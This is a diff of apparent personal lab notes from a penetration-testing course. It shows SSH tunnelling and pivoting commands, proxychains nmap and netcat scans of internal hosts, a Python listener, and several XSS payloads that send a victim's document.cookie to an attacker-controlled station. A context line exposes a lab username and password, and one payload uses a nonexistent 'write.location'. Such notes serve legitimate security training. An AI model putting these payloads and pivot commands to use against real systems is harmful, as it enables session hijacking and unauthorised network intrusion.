@@ -6,4 +6,39 @@ Stack Number	Username	    Password	        jump
 4 	            TYCO-503-M 	    YdAHv92QJMCMNcE 	10.50.41.0
 
 
+------------------------------------------------------------------------------------------------------------------------
+ssh -MS /tmp/jump student@10.50.39.25
+ssh -S /tmp/jump dummy -O forward -D9050
+proxychains nmap 192.168.28.1,2,3,97,98,99,100,105,111,120,129,130,131
+proxychains nc 192.168.28.111 80
+proxychains nc 192.168.29.100 80
+ssh -S /tmp/jump dummy -O forward -L1111:192.168.111:80 -L2222:192.168.28.100
+firefox 127.0.0.1:1111
+ssh -S /tmp/jump dummy -O forward -L1111:192.168.111:80 -L2222:192.168.28.100 -L4444:192.168.28.111:22
+ssh -MS /tmp/t1 student@127.0.0.1 -p 4444
+ssh -S /tmp/t1 dummy -O forward -L5555:192.168.50.100:22
+ssh -MS /tmp/t2 credentials@127.0.0.1 -p 5555
+-------------------------------------------------------------------------------------------------------------------------
+
+nmap --script=http-enum.nse <ip address>
+    if you see robots.txt, go to it in url
+<ip address>/robots.txt
+
+
+python3 -m http.server
+<script>
+	The following examples essentially do the same thing
+
+<script>document.location="http://OP-Station-IP:OPS-PORT/?username=" + document.cookie;</script>
+<script>window.location.href="http://website/?"+document.cookie;</script>
+<script>write.location.href="http://10.50.20.97"</script>
+
+Resources:
+
+    https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
+
+    https://en.wikipedia.org/wiki/Content_Security_Policy
+
+document.location="http://<linops ip>:8000/"+document.cookie;</script>
+
 
